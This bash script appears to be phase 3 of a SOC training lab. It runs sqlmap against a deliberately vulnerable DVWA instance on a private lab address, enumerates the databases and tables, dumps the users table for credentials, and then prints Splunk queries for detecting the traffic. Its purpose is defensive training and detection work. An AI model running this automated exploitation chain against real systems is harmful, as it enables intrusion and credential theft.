#!/bin/bash
#==============================================================================
# SOC Lab — SQL Injection Simulation
# Phase 3: Automated Exploitation with sqlmap
# MITRE ATT&CK: T1190 (Exploit Public-Facing App)
#                + T1083 (File and Directory Discovery)
#                + T1552 (Unsecured Credentials)
#
# Target  : http://10.10.10.10/DVWA/vulnerabilities/sqli/
# Source  : 10.10.10.5 (Kali)
#
# This phase replaces the 8 manual probes from Phase 2 with sqlmap's full
# automated exploitation chain — hundreds of requests, full DB enumeration,
# credential dump.
#
# Usage:
#   ./phase3_sqlmap.sh "PHPSESSID=<your_session_id>"
#==============================================================================

set -u

if [[ $# -lt 1 ]]; then
    echo "ERROR: PHPSESSID cookie required"
    echo "Usage: $0 \"PHPSESSID=<your_session_id>\""
    exit 1
fi

PHPSESSID_VALUE="$1"
PHPSESSID_VALUE="${PHPSESSID_VALUE#PHPSESSID=}"

# --- Config ---
TARGET_IP="10.10.10.10"
TARGET_URL="http://${TARGET_IP}/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"
COOKIE="PHPSESSID=${PHPSESSID_VALUE}; security=low"
OUTDIR="${HOME}/sqli_sim"
LOGFILE="${OUTDIR}/phase3.log"
SQLMAP_DIR="${OUTDIR}/sqlmap_output"

mkdir -p "${OUTDIR}" "${SQLMAP_DIR}"

log() {
    echo "$@" | tee -a "${LOGFILE}"
}

banner() {
    log ""
    log "=============================================================="
    log " $1"
    log "=============================================================="
}

# Wrap sqlmap calls so each step is timestamped in the log
sqlmap_step() {
    local step_name="$1"
    shift
    log ""
    log "----- ${step_name} -----"
    log "Start (UTC): $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)"
    log "Command    : sqlmap $*"
    log ""
    sqlmap "$@" 2>&1 | tee -a "${LOGFILE}"
    log ""
    log "End   (UTC): $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)"
}

# --- Verify sqlmap is installed ---
if ! command -v sqlmap >/dev/null 2>&1; then
    log "ERROR: sqlmap not installed. Run: sudo apt install -y sqlmap"
    exit 1
fi

# --- Pre-flight ---
banner "PHASE 3 - AUTOMATED SQLi via sqlmap  |  MITRE T1190 + T1083 + T1552"
log "Start time   : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
log "Target       : ${TARGET_URL}"
log "Session ID   : ${PHPSESSID_VALUE:0:8}... (truncated)"
log "sqlmap ver   : $(sqlmap --version 2>&1 | head -1)"

log ""
log "[*] Pre-flight: validating session cookie..."
PREFLIGHT_CODE=$(curl -s -b "${COOKIE}" -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET_URL}")
if [[ "${PREFLIGHT_CODE}" != "200" ]]; then
    log "ERROR: pre-flight got HTTP ${PREFLIGHT_CODE} (expected 200) — session likely expired"
    log "Get a fresh PHPSESSID from DVWA and try again"
    exit 1
fi
log "[+] Session valid — beginning sqlmap automation"

# --- Common sqlmap args ---
# --batch: never prompt, accept defaults
# --output-dir: keep session data tidy under our sqli_sim folder
# --flush-session: start fresh each run (otherwise sqlmap caches and skips)
COMMON_ARGS=(
    -u "${TARGET_URL}"
    --cookie="${COOKIE}"
    --batch
    --flush-session
    --output-dir="${SQLMAP_DIR}"
    --level=1
    --risk=1
)

# --- Step 1: Detection + DBMS fingerprint ---
sqlmap_step "Step 1/4 — Detect injection + fingerprint DBMS" \
    "${COMMON_ARGS[@]}" \
    --banner \
    --current-user \
    --current-db \
    --is-dba

# --- Step 2: Enumerate databases (T1083 - file/dir discovery analogue at DB level) ---
sqlmap_step "Step 2/4 — Enumerate databases" \
    "${COMMON_ARGS[@]}" \
    --dbs

# --- Step 3: Enumerate tables in dvwa DB ---
sqlmap_step "Step 3/4 — Enumerate tables in dvwa DB" \
    "${COMMON_ARGS[@]}" \
    -D dvwa \
    --tables

# --- Step 4: Dump users table (T1552 - unsecured credentials) ---
sqlmap_step "Step 4/4 — Dump users table (credential extraction)" \
    "${COMMON_ARGS[@]}" \
    -D dvwa \
    -T users \
    --dump

# --- Summary ---
banner "PHASE 3 COMPLETE"
log "End time : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
log ""
log "sqlmap session data : ${SQLMAP_DIR}"
log "Full session log    : ${LOGFILE}"
log ""
log "Splunk validation queries:"
log ""
log '  # A. Total request volume from sqlmap'
log '  index=main sourcetype=access_combined clientip=10.10.10.5'
log '    uri_path="*sqli*" earliest=-15m'
log '  | timechart span=10s count'
log ''
log '  # B. UA fingerprint - is sqlmap announcing itself?'
log '  index=main sourcetype=access_combined clientip=10.10.10.5'
log '    earliest=-15m'
log '  | stats count by useragent | sort -count'
log ''
log '  # C. Payload diversity from one IP - behavioural detection'
log '  index=main sourcetype=access_combined clientip=10.10.10.5'
log '    uri_path="*sqli*" earliest=-15m'
log '  | stats count, dc(uri_query) as unique_payloads by clientip'
log ''
log '  # D. Response size distribution - extraction queries stand out'
log '  index=main sourcetype=access_combined clientip=10.10.10.5'
log '    uri_path="*sqli*" earliest=-15m'
log '  | stats count by bytes | sort -count'
